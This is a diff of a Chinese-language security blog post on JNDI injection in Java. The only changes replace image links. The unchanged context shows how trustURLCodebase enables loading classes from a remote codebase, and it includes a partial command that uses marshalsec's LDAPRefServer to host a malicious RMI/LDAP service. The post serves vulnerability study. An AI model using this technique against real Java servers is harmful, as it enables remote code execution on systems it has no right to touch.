@@ -120,10 +120,10 @@ public class RMIClient1 {
 在RMIClient1.java中，我把`com.sun.jndi.ldap.object.trustURLCodebase`设置为true，没加上之前一直不成功，一步一步跟一下才解决问题，看下我的分析步骤：
 
 跟进lookup，然后在`javax/naming/spi/NamingManager.java:146`会尝试从本地加载类
-![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/85a522d4-e055-58af-d92e-affc2f68e062.png)
+![image.png](https://y4er.com/img/uploads/20200419226219.png)
 
 如不在classpath中会尝试从codebase加载
-![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/ec3608e4-7164-85dd-5443-ff7faa273365.png)
+![image.png](https://y4er.com/img/uploads/20200419224213.png)
 
 跟进loadClass
 
@@ -174,7 +174,7 @@ private static final String trustURLCodebase =
 
 最后的效果就是这样
 
-![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/0cdaf07e-4ee7-e925-eb37-8ecbdbc26c30.png)
+![image.png](https://y4er.com/img/uploads/20200419226392.png)
 
 在实战用我更倾向于使用marshalsec来起RMI恶意服务，RMI服务端口号默认为1099
 
@@ -201,7 +201,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://
 
 一张图来展示JNDI注入的利用方式与JDK版本的关系：
 
-![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/0c2621c8-a2c3-fb3a-b27b-b8f0448863f4.png)
+![image.png](https://y4er.com/img/uploads/20200419225882.png)
 
 > 图引用于 https://xz.aliyun.com/t/6633
 
